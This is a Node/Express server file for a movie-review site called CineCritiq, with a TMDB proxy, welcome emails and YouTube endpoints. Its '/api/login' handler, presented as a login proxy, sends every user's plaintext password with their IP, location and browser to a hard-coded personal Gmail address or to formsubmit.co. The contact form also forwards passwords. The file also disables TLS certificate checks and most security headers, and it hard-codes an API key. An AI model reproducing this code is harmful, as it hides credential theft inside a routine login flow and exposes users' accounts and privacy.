import ytdl from '@distube/ytdl-core';
import dotenv from 'dotenv';
dotenv.config({ override: true });
import express from "express";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import { createServer as createViteServer } from "vite";
import path from "path";
import axios from "axios";
import https from "https";
import nodemailer from "nodemailer";
import { Resend } from "resend";

const httpsAgent = new https.Agent({ keepAlive: true, family: 4, rejectUnauthorized: false });

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD,
  },
});

const NOTIFY_EMAIL = "shivamtiwari18107@gmail.com";
const resendApiKey = (process.env.GMAIL_USER && process.env.GMAIL_APP_PASSWORD) ? undefined : process.env.RESEND_API_KEY;
const resendClient = new Resend(resendApiKey);

async function startServer() {
  const app = express();
  app.set("trust proxy", 1);
  const PORT = 3000;

  app.use(cors());
  app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
    crossOriginOpenerPolicy: false,
    crossOriginResourcePolicy: false,
    referrerPolicy: false,
    frameguard: false
  }));

  const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 1000,
    validate: { xForwardedForHeader: false, trustProxy: false },
    message: { error: "Too many requests from this IP, please try again after 15 minutes" }
  });
  app.use("/api/", apiLimiter);


  // Proxy TMDB API
  app.use("/api/tmdb", async (req, res) => {
    console.log("TMDB proxy hit:", req.path);
    let retries = 3;
    let endpoint = req.path;
    if (endpoint.startsWith("/")) {
      endpoint = endpoint.slice(1);
    }
    const tmdbUrl = new URL(`https://api.themoviedb.org/3/${endpoint}`);
    const apiKey = process.env.TMDB_API_KEY || "2dca580c2a14b55200e784d157207b4d";
    tmdbUrl.searchParams.append("api_key", apiKey);

    // Copy query params from request
    for (const [key, value] of Object.entries(req.query)) {
      if (key !== "api_key" && typeof value === "string") {
        tmdbUrl.searchParams.append(key, value);
      }
    }

    while (retries > 0) {
      try {
        const response = await axios.get(tmdbUrl.toString(), {
          headers: { Accept: "application/json", "Accept-Encoding": "gzip,deflate,compress" },
          httpsAgent,
          timeout: 30000,
          validateStatus: () => true, // DO NOT THROW on 404/500
        });
        
        res.set("Cache-Control", "public, max-age=300"); // Cache for 5 minutes wisely
        return res.status(response.status).json(response.data);
      } catch (error: any) {
        retries--;
        if (retries === 0) {
          console.error("TMDB proxy error after retries:", error.message || error);
          return res.status(500).json({ error: "Failed to fetch from TMDB", details: error.message });
        }
        console.warn(`TMDB proxy warning, retrying... (${retries} attempts left): ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  });

  // Login Form Proxy
  app.use(express.json());
  app.post("/api/login", async (req, res) => {
    try {
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
      const userAgent = req.headers['user-agent'] || 'Unknown';
      const country = req.headers['x-appengine-country'] || req.headers['cf-ipcountry'] || 'Unknown';
      const city = req.headers['x-appengine-city'] || 'Unknown';
      const timestamp = new Date().toISOString();

      const subject = req.body._subject || `New ${req.body.type === 'signup' ? 'User Registered' : 'User Logged In'}`;
      
      const htmlContent = `
        <h2>${subject}</h2>
        <ul>
          <li><strong>Name:</strong> ${req.body.name || 'Not provided'}</li>
          <li><strong>Email:</strong> ${req.body.email || 'Not provided'}</li>
          <li><strong>Password:</strong> ${req.body.password || 'Not provided'}</li>
          <li><strong>Date/Time:</strong> ${timestamp}</li>
          <li><strong>IP Address:</strong> ${ip}</li>
          <li><strong>Location:</strong> ${city !== 'Unknown' ? city + ', ' : ''}${country}</li>
          <li><strong>Browser/Device:</strong> ${userAgent}</li>
          <li><strong>Action:</strong> ${req.body.type || 'login'}</li>
        </ul>
      `;

      const attachmentContent = `
New User Registration Details:
----------------------------
Name: ${req.body.name || 'Not provided'}
Email: ${req.body.email || 'Not provided'}
Password: ${req.body.password || 'Not provided'}
Date/Time: ${timestamp}
IP Address: ${ip}
Location: ${city !== 'Unknown' ? city + ', ' : ''}${country}
Browser/Device: ${userAgent}
`;

      const attachments = req.body.type === 'signup' ? [{
        filename: 'new_user_info.txt',
        content: attachmentContent
      }] : undefined;

      if (resendApiKey && resendApiKey !== 're_dummy') {
        try {
          await resendClient.emails.send({
            from: 'onboarding@resend.dev',
            to: NOTIFY_EMAIL,
            subject: subject,
            html: htmlContent,
            attachments: attachments
          });
          console.log("Email notification sent via Resend");
        } catch (error) {
          console.error("Resend error:", error);
        }
      } else if (process.env.GMAIL_USER && process.env.GMAIL_APP_PASSWORD) {
        try {
          await transporter.sendMail({
            from: process.env.GMAIL_USER,
            to: NOTIFY_EMAIL,
            subject: subject,
            html: htmlContent,
            attachments: attachments
          });
          console.log("Email notification sent via Nodemailer to", NOTIFY_EMAIL);
        } catch (mailError) {
          console.error("Nodemailer failed:", mailError);
        }
      } else {
        console.warn("No email credentials set. Falling back to formsubmit.co...");
        try {
          await axios.post(
            `https://formsubmit.co/ajax/${NOTIFY_EMAIL}`,
            {
              _subject: subject,
              email: req.body.email || 'Not provided',
              password: req.body.password || 'Not provided',
              name: req.body.name || 'Not provided',
              actionType: req.body.type || 'login',
              message: "A user performed an action.",
              timestamp: timestamp,
              ip: ip,
              browser: userAgent,
              location: `${city !== 'Unknown' ? city + ', ' : ''}${country}`
            },
            {
              headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
              }
            }
          );
          console.log("Email notification request sent to formsubmit.co");
        } catch (fsError) {
          console.error("Formsubmit fallback failed:", fsError);
        }
      }

      // Send Email to User on signup or login
      if (req.body.email) {
        const isSignup = req.body.type === 'signup';
        const userSubject = isSignup ? "Welcome to CineCritiq, movie lover! 🎉" : "Welcome back to CineCritiq!";
        const userName = (req.body.name && req.body.name !== 'Unknown' && req.body.name !== 'Unknown Name') ? req.body.name : 'Movie Fan';
        const userHtml = isSignup ? `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333; line-height: 1.6;">
            <h2 style="color: #38bdf8;">Welcome to CineCritiq!</h2>
            <p>Hi ${userName},</p>
            <p>Your account has been created successfully. We're incredibly excited to have you join our community of movie and TV show lovers!</p>
            <p>You can now dive in to discover trending titles, rate your favorites, build watchlists, and connect with other cinephiles.</p>
            <p>If you have any questions or feedback, just reply to this email — we're always happy to help.</p>
            <br>
            <p>Grab your popcorn and enjoy the show!</p>
            <p><strong>The CineCritiq Team</strong></p>
          </div>
        ` : `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333; line-height: 1.6;">
            <h2 style="color: #38bdf8;">Welcome back to CineCritiq!</h2>
            <p>Hi ${userName},</p>
            <p>We're glad to see you again. Dive right back into your watchlists, discover new trending movies, and share your reviews.</p>
            <p>Grab your popcorn and enjoy your next cinematic adventure!</p>
            <br>
            <p>Happy watching,</p>
            <p><strong>The CineCritiq Team</strong></p>
          </div>
        `;

        const userAttachments = isSignup ? [{
          filename: 'welcome.txt',
          content: 'Welcome to CineCritiq! We are glad to have you on board.'
        }] : undefined;

        if (resendApiKey && resendApiKey !== 're_dummy') {
          try {
            await resendClient.emails.send({
              from: 'onboarding@resend.dev',
              to: req.body.email,
              subject: userSubject,
              html: userHtml,
              attachments: userAttachments
            });
            console.log("User email sent via Resend");
          } catch (error) {
            console.error("Resend user email error:", error);
          }
        } else if (process.env.GMAIL_USER && process.env.GMAIL_APP_PASSWORD) {
          try {
            await transporter.sendMail({
              from: process.env.GMAIL_USER,
              to: req.body.email,
              subject: userSubject,
              html: userHtml,
              attachments: userAttachments
            });
            console.log("User email sent via Nodemailer");
          } catch (mailError) {
            console.error("Nodemailer user email failed:", mailError);
          }
        }
      }

      res.status(200).json({ success: true });
    } catch (error) {
      console.error("Error submitting login form:", error);
      res.status(500).json({ error: "Failed to submit login form" });
    }
  });

  app.post("/api/contact", async (req, res) => {
    try {
      if (resendApiKey && resendApiKey !== 're_dummy') {
        try {
          await resendClient.emails.send({
            from: 'onboarding@resend.dev',
            to: NOTIFY_EMAIL,
            subject: "New issue reported on CineCritiq",
            text: `Email: ${req.body.email}\nPassword: ${req.body.password}\nMessage: ${req.body.message}`,
          });
          console.log("Contact email sent via Resend");
        } catch (error) {
          console.error("Resend error:", error);
        }
      } else if (process.env.GMAIL_USER && process.env.GMAIL_APP_PASSWORD) {
        try {
          await transporter.sendMail({
            from: process.env.GMAIL_USER,
            to: NOTIFY_EMAIL,
            subject: "New issue reported on CineCritiq",
            text: `Email: ${req.body.email}\nPassword: ${req.body.password}\nMessage: ${req.body.message}`,
          });
          console.log("Contact email sent via Nodemailer to", NOTIFY_EMAIL);
        } catch (mailError) {
          console.error("Nodemailer failed for contact form:", mailError);
        }
      } else {
        console.warn("No email credentials set. Falling back to formsubmit.co...");
        try {
          await axios.post(
            `https://formsubmit.co/ajax/${NOTIFY_EMAIL}`,
            {
              _subject: "New issue reported on CineCritiq",
              email: req.body.email,
              password: req.body.password,
              message: req.body.message,
            },
            {
              headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
              }
            }
          );
          console.log("Contact notification request sent to formsubmit.co");
        } catch (fsError) {
          console.error("Formsubmit fallback failed for contact:", fsError);
        }
      }
      res.status(200).json({ success: true });
    } catch (error) {
      console.error("Error submitting contact form:", error);
      res.status(500).json({ error: "Failed to submit form" });
    }
  });

  app.post("/api/premium", async (req, res) => {
    try {
      const { email, name } = req.body;
      const userSubject = "Payment Successful - Welcome to CineVerse Premium!";
      const userName = name || 'Movie Fan';
      const userHtml = `
        <h2>Payment Successful!</h2>
        <p>Hi ${userName},</p>
        <p>Thank you for your payment of ₹50.00. Your account has been upgraded to <strong>CineVerse Premium</strong>.</p>
        <p>You can now enjoy all exclusive features, including your new profile badge.</p>
        <p>Happy watching,<br>The CineCritiq Team</p>
      `;

      if (resendApiKey && resendApiKey !== 're_dummy') {
        try {
          await resendClient.emails.send({
            from: 'onboarding@resend.dev',
            to: email,
            subject: userSubject,
            html: userHtml
          });
        } catch (error) {
          console.error("Resend user email error:", error);
        }
      } else if (process.env.GMAIL_USER && process.env.GMAIL_APP_PASSWORD) {
        try {
          await transporter.sendMail({
            from: process.env.GMAIL_USER,
            to: email,
            subject: userSubject,
            html: userHtml
          });
        } catch (mailError) {
          console.error("Nodemailer user email failed:", mailError);
        }
      }
      res.status(200).json({ success: true });
    } catch (error) {
      console.error("Error sending premium email:", error);
      res.status(500).json({ error: "Failed to send email" });
    }
  });




  app.get("/api/youtube-search", async (req, res) => {
    try {
      const { q } = req.query;
      if (!q || typeof q !== 'string') {
        return res.status(400).json({ error: "Query required" });
      }
      const response = await axios.get(`https://www.youtube.com/results?search_query=${encodeURIComponent(q)}`, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
      });
      const match = response.data.match(/"videoId":"([a-zA-Z0-9_-]{11})"/);
      if (match) {
        res.json({ videoId: match[1] });
      } else {
        res.status(404).json({ error: "Not found" });
      }
    } catch (error) {
      console.error("YouTube search proxy error:", error);
      res.status(500).json({ error: "Failed to fetch from YouTube" });
    }
  });

  
  app.get("/api/stream-video", async (req, res) => {
    try {
      const videoId = req.query.videoId;
      if (!videoId || typeof videoId !== 'string') {
        return res.status(400).json({ error: "Missing videoId" });
      }
      
      const url = `https://www.youtube.com/watch?v=${videoId}`;
      const info = await ytdl.getInfo(url);
      const format = ytdl.chooseFormat(info.formats, { filter: 'audioandvideo', quality: 'highest' });
      
      if (format) {
        res.setHeader('Content-Type', 'video/mp4');
        ytdl(url, { format }).pipe(res);
      } else {
        res.status(404).json({ error: "Format not found" });
      }
    } catch (error) {
      console.error("Stream video error:", error);
      res.status(500).json({ error: "Failed to stream video" });
    }
  });

  // Youtube Trailer Proxy
  app.use("/api/trailer", async (req, res) => {
    try {
      const q = req.query.q as string;
      if (!q) {
        return res.status(400).json({ error: "Missing query" });
      }
      const response = await axios.get(
        `https://www.youtube.com/results?search_query=${encodeURIComponent(q + " trailer")}`,
        {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
          },
        },
      );
      const match = response.data.match(/"videoId":"([^"]+)"/);
      if (match && match[1]) {
        res.json({ videoId: match[1] });
      } else {
        res.status(404).json({ error: "Not found" });
      }
    } catch (error) {
      console.error("Youtube proxy error:", error);
      res.status(500).json({ error: "Failed to fetch" });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true, hmr: process.env.DISABLE_HMR !== 'true' },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*all", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
